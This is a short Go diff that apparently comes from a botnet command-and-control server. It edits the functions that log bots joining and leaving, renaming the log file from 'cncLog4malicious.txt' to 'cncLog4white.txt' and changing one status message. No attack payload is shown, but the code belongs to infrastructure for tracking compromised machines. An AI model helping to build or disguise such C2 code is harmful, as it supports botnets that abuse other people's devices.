@@ -56,7 +56,7 @@ func (this *ClientList) AddClient(c *Bot) {
     botCountAdd := this.Count()
     this.addQueue <- c
 
-    file, err := os.OpenFile("cncLog4malicious.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4white.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
@@ -64,7 +64,7 @@ func (this *ClientList) AddClient(c *Bot) {
     defer file.Close()
     fmt.Fprintf(file, "%s\t%d\tAdd\t%s\n",formattedTimeAdd,botCountAdd, c.conn.RemoteAddr())
     
-    fmt.Printf("%s num-%d Add     client %d - %s - %s\n",formattedTimeAdd,botCountAdd, c.version, c.source, c.conn.RemoteAddr())
+    fmt.Printf("%s num-%d Added   client %d - %s - %s\n",formattedTimeAdd,botCountAdd, c.version, c.source, c.conn.RemoteAddr())
 }
 
 func (this *ClientList) DelClient(c *Bot) {
@@ -73,7 +73,7 @@ func (this *ClientList) DelClient(c *Bot) {
     botCountDel := this.Count()
     this.delQueue <- c
 
-    file, err := os.OpenFile("cncLog4malicious.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
+    file, err := os.OpenFile("cncLog4white.txt",os.O_APPEND|os.O_CREATE|os.O_WRONLY,0644)
     if err != nil{
         fmt.Println("Error opening file:",err)
         return
